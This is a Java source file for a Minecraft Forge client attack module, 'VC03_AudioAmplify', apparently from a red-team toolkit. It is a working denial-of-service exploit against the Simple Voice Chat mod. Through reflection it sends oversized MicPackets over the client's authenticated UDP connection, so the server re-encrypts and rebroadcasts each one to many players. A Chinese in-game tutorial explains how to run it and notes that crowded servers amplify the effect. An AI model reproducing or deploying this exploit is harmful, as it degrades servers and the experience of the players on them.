package com.redblue.red.modules.voicechat;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import net.minecraft.client.Minecraft;
import net.minecraft.network.chat.Component;
import net.minecraft.network.chat.Style;
import net.minecraftforge.fml.ModList;

import java.lang.reflect.Method;
import java.util.List;

/**
 * VC-03: MicPacket Audio Amplification DoS
 *
 * Vulnerability: MicPacket.fromBytes() calls readByteArray() with no size limit.
 * Server re-broadcasts each MicPacket to N players in range (proximity) or group,
 * causing 1-to-N amplification of CPU (encrypt per recipient) and bandwidth.
 *
 * Attack: Send oversized MicPacket via the client's own authenticated UDP connection
 * using reflection to access ClientVoicechatConnection.sendToServer().
 *
 * The client already has a valid Secret and authenticated connection.
 * We construct a MicPacket with a large data payload and send it through
 * the existing voicechat client infrastructure.
 */
public class VC03_AudioAmplify implements AttackModule {

    private long lastTick = 0;
    private int totalSent = 0;
    private long sequenceNumber = 0;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBool("confirm_danger", "确认: 这会消耗服务器资源", false),
        ConfigParam.ofInt("data_size", "音频数据大小(字节)", 8000, 960, 65000),
        ConfigParam.ofInt("interval", "发包间隔(tick)", 1, 1, 20),
        ConfigParam.ofInt("max_packets", "最大发包数", 200, 1, 5000),
        ConfigParam.ofBool("whispering", "耳语模式(缩小范围)", false)
    );

    @Override public String id() { return "vc03_audio_amplify"; }
    @Override public String name() { return "音频放大DoS"; }
    @Override public String description() { return "发送超大MicPacket利用服务端1:N转发放大"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 确保语音聊天已连接(客户端已完成UDP认证)\n"
            + "2. 勾选确认复选框\n"
            + "3. 启用模块, tick循环自动发送超大MicPacket\n\n"
            + "[原理]\n"
            + "MicPacket.fromBytes() 中 readByteArray() 无大小限制.\n"
            + "服务端收到后在 processMicPacket() 中:\n"
            + "- proximity模式: 转发给范围内所有玩家\n"
            + "- group模式: 转发给群组内所有成员\n"
            + "每次转发需要用接收者的Secret重新加密.\n"
            + "1个恶意包 -> N个加密+发送操作 = CPU/带宽放大.\n\n"
            + "[参数说明]\n"
            + "音频数据大小: 正常约960字节, 设大值增加带宽消耗\n"
            + "耳语模式: 开启后范围缩小, 关闭则影响更多玩家\n\n"
            + "[前提]\n"
            + "必须已连接语音聊天(有有效的UDP连接).\n"
            + "人多的服务器放大效果更明显.";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("voicechat");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) {
            chat(mc, "请先勾选确认复选框");
            return;
        }

        totalSent = 0;
        sequenceNumber = 0;

        // Check if voicechat connection exists
        if (!isVoicechatConnected()) {
            chat(mc, "语音聊天未连接, 请先确保voicechat已连接");
            return;
        }

        chat(mc, "开始音频放大攻击");
        sendOneMicPacket(mc);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) return;

        int maxPackets = getParam("max_packets").map(ConfigParam::getInt).orElse(200);
        if (totalSent >= maxPackets) return;

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(1);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;

        sendOneMicPacket(mc);
    }

    private void sendOneMicPacket(Minecraft mc) {
        int dataSize = getParam("data_size").map(ConfigParam::getInt).orElse(8000);
        boolean whisper = getParam("whispering").map(ConfigParam::getBool).orElse(false);

        try {
            // Get the client's voicechat connection via reflection
            // ClientManager.getClient() -> ClientVoicechat
            // ClientVoicechat.getConnection() -> ClientVoicechatConnection
            // ClientVoicechatConnection.sendToServer(NetworkMessage)
            Object clientVoicechat = getClientVoicechat();
            if (clientVoicechat == null) {
                chat(mc, "无法获取voicechat客户端实例");
                return;
            }

            Object connection = getVoicechatConnection(clientVoicechat);
            if (connection == null) {
                chat(mc, "语音连接不存在, 请等待连接建立");
                return;
            }

            // Check if connection is initialized
            Method isInitialized = connection.getClass().getMethod("isInitialized");
            if (!(boolean) isInitialized.invoke(connection)) {
                chat(mc, "语音连接未完成认证");
                return;
            }

            // Create MicPacket with oversized data
            byte[] bigData = new byte[dataSize];
            // Fill with pseudo-random to avoid compression
            for (int i = 0; i < bigData.length; i++) {
                bigData[i] = (byte) (i * 7 + 13);
            }

            Class<?> micPacketClass = Class.forName(
                "de.maxhenkel.voicechat.voice.common.MicPacket");
            Object micPacket = micPacketClass
                .getConstructor(byte[].class, boolean.class, long.class)
                .newInstance(bigData, whisper, sequenceNumber++);

            // Wrap in NetworkMessage
            Class<?> networkMessageClass = Class.forName(
                "de.maxhenkel.voicechat.voice.common.NetworkMessage");
            // Use the Packet<?> constructor
            Class<?> packetInterface = Class.forName(
                "de.maxhenkel.voicechat.voice.common.Packet");
            Object networkMessage = networkMessageClass
                .getConstructor(packetInterface)
                .newInstance(micPacket);

            // Send via connection.sendToServer(NetworkMessage)
            Method sendToServer = connection.getClass()
                .getMethod("sendToServer", networkMessageClass);
            sendToServer.invoke(connection, networkMessage);

            totalSent++;
            if (totalSent % 50 == 0) {
                int maxPackets = getParam("max_packets").map(ConfigParam::getInt).orElse(200);
                chat(mc, "已发送 " + totalSent + " / " + maxPackets
                    + " 个MicPacket (每个 " + dataSize + " 字节)");
            }
        } catch (Exception e) {
            chat(mc, "发送失败: " + e.getMessage());
        }
    }

    private boolean isVoicechatConnected() {
        try {
            Object client = getClientVoicechat();
            if (client == null) return false;
            Object conn = getVoicechatConnection(client);
            if (conn == null) return false;
            Method isInitialized = conn.getClass().getMethod("isInitialized");
            return (boolean) isInitialized.invoke(conn);
        } catch (Exception e) {
            return false;
        }
    }

    private Object getClientVoicechat() throws Exception {
        Class<?> cmClass = Class.forName(
            "de.maxhenkel.voicechat.voice.client.ClientManager");
        Method getClient = cmClass.getMethod("getClient");
        return getClient.invoke(null);
    }

    private Object getVoicechatConnection(Object clientVoicechat) throws Exception {
        Method getConnection = clientVoicechat.getClass()
            .getMethod("getConnection");
        return getConnection.invoke(clientVoicechat);
    }

    private static void chat(Minecraft mc, String msg) {
        if (mc.player != null) {
            mc.player.displayClientMessage(
                Component.literal("[VC03] " + msg)
                    .withStyle(Style.EMPTY.withColor(0xFF5555)),
                false
            );
        }
    }
}
